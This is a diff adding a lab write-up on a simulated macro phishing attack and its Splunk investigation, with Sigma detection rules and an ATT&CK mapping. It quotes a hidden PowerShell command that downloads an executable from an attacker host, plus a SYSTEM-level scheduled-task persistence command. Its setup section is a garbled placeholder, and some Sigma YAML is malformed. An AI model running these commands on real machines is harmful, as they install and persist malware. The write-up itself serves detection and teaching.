@@ -833,7 +833,356 @@ Serve as a foundation for alerting and threat hunting
 
 ## Use Case 2: Phishing via Malicious Word Attachment
 
+## Scenario Overview
+In this scenario, we simulate a phishing attack where the attacker delivers a malicious Microsoft Word document (`Invoice.docx`) via email. When the victim opens the file and enables macros, embedded VBA code triggers a PowerShell command that downloads a secondary payload from a Command and Control (C2) server. The malware then executes, collects basic host information, and exfiltrates it back to the attacker.
 
+
+### Attack Flow
+
+1. **Initial Access (Phishing):**
+    
+    The victim receives a phishing email containing a malicious Word attachment (`.doc`) disguised as an invoice or official document.
+    
+2. **Execution (User Interaction):**
+    
+    The user opens the document and clicks **"Enable Content"**, allowing the embedded macro to run.
+    
+3. **Execution (Macro → PowerShell):**
+    
+    The VBA macro spawns a hidden PowerShell process 
+    
+4. **Payload Delivery:**
+    
+    PowerShell downloads the malware (script or binary) from the attacker’s C2 server.
+    
+5. **Persistence:**
+    
+    The downloaded payload establish persistence via:
+    - Scheduled Task
+    
+6. **Discovery:**
+    
+    The malware collects:
+    
+    - Computer Name
+    - Username
+    - OS Version
+  
+7. **C2 Communication:**
+    
+    The malware establishes communication with the C2 server over HTTP/HTTPS.
+    
+8. **Exfiltration:**
+    
+    Collected data is sent back to the attacker via HTTP POST requests.
+
+
+### MITRE ATT&CK Mapping
+
+| Stage | Action | MITRE ATT&CK ID | Artifacts / Logs |
+| --- | --- | --- | --- |
+| **Initial Access** | Phishing email with malicious attachment | **Phishing: Attachment (T1566.001)** | Email Gateway Logs / Outlook Logs |
+| **Execution** | User enables macros in Word | **User Execution (T1204.002)** | Office Alerts / User Activity |
+| **Execution** | VBA macro runs PowerShell | **Command and Scripting Interpreter: PowerShell (T1059.001)** | Sysmon Event ID 1 |
+| **Defense Evasion** | PowerShell runs with hidden window & bypass policy | **Obfuscated/Compressed Files (T1027)** | PowerShell Logs / EDR |
+| **Payload Delivery** | Downloads payload from C2 | **Ingress Tool Transfer (T1105)** | Sysmon Event ID 3 |
+| **Persistence** | Registry Run Key / Scheduled Task | **Boot or Logon Autostart (T1547.001)** | Sysmon Event ID 13 |
+| **Discovery** | Collects system information | **System Information Discovery (T1082)** | EDR Telemetry |
+| **C2 Channel** | HTTP/HTTPS communication | **Application Layer Protocol (T1071.001)** | Network Logs / Proxy |
+| **Exfiltration** | Data sent via HTTP POST | **Exfiltration Over C2 Channel (T1041)** | PCAP / Network Monitoring |
+
+## Environment & Malware Setup
+
+$$blblblblblbblbllllllllblblblblblbbblbl%%
+
+
+## Detection & Analysis
+
+It was just another boring Tuesday… nothing special, until suddenly an alert popped up saying that the machine **DESKTOP-MOPLS2N** might be compromised, and you’re required to investigate, build a timeline, and deliver a report.
+
+The only piece of info you had was an MD5 hash:
+
+**MD5:** `3FD59CE4A49E118D86180828E041AC5B`
+
+---
+
+So I started by searching for the hash in Splunk:
+
+```
+index=* host="DESKTOP-MOPLS2N" | search NOT Image="*splunk-*.exe*" MD5=3FD59CE4A49E118D86180828E041AC5B
+```
+
+But… nothing showed up. No logs, no hits.
+
+So clearly, I needed another way to pivot.
+
+<img width="1365" height="622" alt="Screenshot_1" src="https://github.com/user-attachments/assets/c4924295-8568-43e9-ba1a-c61f6aa05604" />
+
+---
+
+At this stage, I suspected this might be a **phishing attack**, so I decided to check the hash on threat intel sources like VirusTotal.
+
+And yeah… the file was flagged as **malicious**.
+
+Also got some extra info:
+
+- File name: `Invoice1.doc`
+- File type: Word document
+
+So now the story is getting clearer.
+
+<img width="1365" height="624" alt="Screenshot_2" src="https://github.com/user-attachments/assets/c95a801a-b869-4d9a-afdc-27ff43d33d3b" />
+
+---
+
+I went back to Splunk and searched using the file name:
+
+```
+index=* host="DESKTOP-MOPLS2N" | search NOT Image="*splunk-*.exe*" Invoice1.doc
+```
+
+While digging through the logs, I noticed something interesting.
+
+There was a **Word document (Invoice.doc)** executed by **WINWORD.EXE**.
+
+At first glance, everything looked legit… just a normal user opening a document, But then things started to get a bit weird.
+
+<img width="1365" height="618" alt="Screenshot_3" src="https://github.com/user-attachments/assets/eea1f1ad-493b-4b8d-8cd3-3ace85c18770" />
+<img width="1141" height="595" alt="Screenshot_4" src="https://github.com/user-attachments/assets/84c04c57-36e4-4858-96f3-ba2dd2280542" />
+
+---
+
+I found that **Invoice1.doc** spawned a **PowerShell child process** with the following command:
+
+```
+powershell-WindowStyleHidden-ExecutionPolicyBypass-Command"(New-Object System.Net.WebClient).DownloadFile('http://192.168.61.128/WindowsUpdate.exe','C:\Users\GLITCH\AppData\Local\Temp\WindowsUpdate.exe')"
+```
+
+Even if you’re not deep into PowerShell, this is pretty straightforward:
+
+- It connects to a remote server (C2) → `192.168.61.128`
+- Downloads a file → `WindowsUpdate.exe`
+- Saves it in → Temp directory
+
+At this point… yeah, things are definitely not okay 😂
+
+<img width="1151" height="593" alt="Screenshot_5" src="https://github.com/user-attachments/assets/d264e898-ddbb-43ae-82ca-5ade0365a232" />
+
+---
+
+### Detection (Sigma Role) :
+
+We can detect this behavior using the following Sigma rule:
+
+```
+title: Suspicious PowerShell DownloadFile Usage
+id: ps-downloadfile
+logsource:
+  product: windows
+  category: process_creation
+
+detection:
+  selection:
+    Image|endswith:'powershell.exe'
+    CommandLine|contains:
+      -'DownloadFile'
+      -'System.Net.WebClient'
+  condition: selection
+
+level: high
+```
+
+Between the events, there was an important log showing that the user actually **enabled macros**. 
+
+That’s a very big deal in our story
+
+<img width="1156" height="433" alt="Screenshot_6" src="https://github.com/user-attachments/assets/dfc02616-41ca-4907-a2a7-9f2fa8058ca7" />
+
+---
+
+### What’s happening so far?
+
+- User downloads Word file
+- Opens it
+- Enables macros
+- Macro runs malicious PowerShell
+- PowerShell downloads malware
+- Malware gets executed
+
+Classic.
+
+---
+
+### Detection Opportunity:
+
+We can detect Word spawning PowerShell using:
+
+```
+title: Word Spawning PowerShell
+id: word-spawn-ps
+logsource:
+  product: windows
+  category: process_creation
+
+detection:
+  selection:
+    ParentImage|endswith:'WINWORD.EXE'
+    Image|endswith:'powershell.exe'
+  condition: selection
+
+level: high
+```
+
+---
+
+Now let’s move to the malware itself → **WindowsUpdate.exe**
+
+I used:
+
+```
+index=* host="DESKTOP-MOPLS2N" | search NOT Image="*splunk-*.exe*" WindowsUpdate.exe
+```
+
+<img width="1365" height="624" alt="Screenshot_8" src="https://github.com/user-attachments/assets/f386c627-5f5c-4225-a650-50355b5a7508" />
+
+---
+
+### Timeline
+
+- PowerShell execution → `10:24:19`
+- File created → `10:24:22`
+- Malware executed → `10:24:24`
+
+Everything happened within seconds… super fast chain.
+
+<img width="1159" height="629" alt="Screenshot_7" src="https://github.com/user-attachments/assets/7ef8f62b-2563-42f7-a82f-4202958e846f" />
+
+---
+
+Then I noticed a **network connection (EventCode=3)**:
+
+- Victim → `DESKTOP-MOPLS2N`
+- Attacker → `192.168.61.128`
+- Port → `8080`
+
+Most likely this is **C2 communication / data exfiltration**
+
+(We don’t have full telemetry, but yeah… looks sus enough)
+
+<img width="1097" height="622" alt="Screenshot_9" src="https://github.com/user-attachments/assets/cad23022-e023-4407-a9a4-f7113ce82392" />
+
+---
+
+### Detection Opportunity:
+
+Detect suspicious outbound connections:
+
+```
+title: Suspicious Outbound Connection to C2
+id: c2-connection
+logsource:
+  product: windows
+  category: network_connection
+
+detection:
+  selection:
+    DestinationPort: 8080
+  condition: selection
+
+level: medium
+```
+
+---
+
+While digging deeper, I found something more interesting…
+
+A **Scheduled Task** was created:
+
+```
+"C:\Windows\System32\cmd.exe"/cschtasks/create/tn"WindowsUpdateTask"/tr"C:\Users\GLITCH\AppData\Local\Temp\WindowsUpdate.exe"/scONLOGON/ruSYSTEM/f/rlHIGHEST
+```
+
+<img width="1161" height="594" alt="Screenshot_10" src="https://github.com/user-attachments/assets/721a549e-c982-4f7b-ac15-87940682d94e" />
+
+---
+
+This basically means:
+
+- Create a task named `WindowsUpdateTask`
+- Execute the malware on every logon
+- Run it as SYSTEM (highest privileges)
+
+That’s **Persistence**
+
+---
+
+###  Detection Opportunity:
+
+Detect suspicious scheduled task creation:
+
+```
+title: Suspicious Scheduled Task Creation
+id: schtask-persistence
+logsource:
+  product: windows
+  category: process_creation
+
+detection:
+  selection:
+    Image|endswith:'schtasks.exe'
+    CommandLine|contains:
+      -'/create'
+      -'ONLOGON'
+  condition: selection
+
+level: medium
+```
+
+---
+
+After that, logs showed repeated connections every ~30 seconds.
+
+Yeah… classic **beaconing pattern** (and honestly, kinda noisy 😅)
+
+---
+
+# Summary
+
+### What Happened (Timeline)
+
+1. User downloaded a malicious Word file (`Invoice1.doc`)
+2. Opened it and enabled macros
+3. Macro executed PowerShell
+4. PowerShell downloaded `WindowsUpdate.exe` from attacker C2
+5. Malware executed on the system
+6. Established connection to attacker (C2)
+7. Created Scheduled Task for persistence
+8. Started beaconing every ~30 seconds
+
+---
+
+### MITRE ATT&CK Mapping
+
+- Phishing → `T1566`
+- User Execution (Macro) → `T1204.002`
+- PowerShell Execution → `T1059.001`
+- Ingress Tool Transfer → `T1105`
+- Persistence (Scheduled Task) → `T1547.001`
+- C2 Communication → `T1071`
+
+---
+
+# (SIEM / Detection Engineering)
+
+The Sigma rules above can be converted into SIEM queries.
+
+### Example (Splunk):
+
+```
+index=* EventCode=1 Image="*powershell.exe*" CommandLine="*DownloadFile*"
+```
+
+---
 
 
 
